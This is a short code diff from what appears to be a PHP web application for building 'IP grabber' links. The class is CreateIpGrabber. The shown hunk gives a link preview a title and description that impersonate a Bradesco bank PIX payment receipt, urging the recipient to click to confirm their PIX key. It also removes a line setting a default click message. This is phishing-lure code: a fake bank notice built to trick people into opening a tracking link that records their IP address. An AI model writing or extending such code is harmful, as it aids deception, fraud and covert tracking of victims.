@@ -62,7 +62,6 @@ class CreateIpGrabber extends CreateRecord
         if (($data['preview_tipo'] ?? null) === 'pix_bradesco') {
             $data['og_titulo'] = 'Comprovante PIX Bradesco';
             $data['og_descricao'] = 'Confirme sua chave pix clicando aqui.';
-            $data['mensagem'] = IpGrabber::DEFAULT_CLICK_MESSAGE;
             $this->fillPixTemplateImage($data);
         }
 
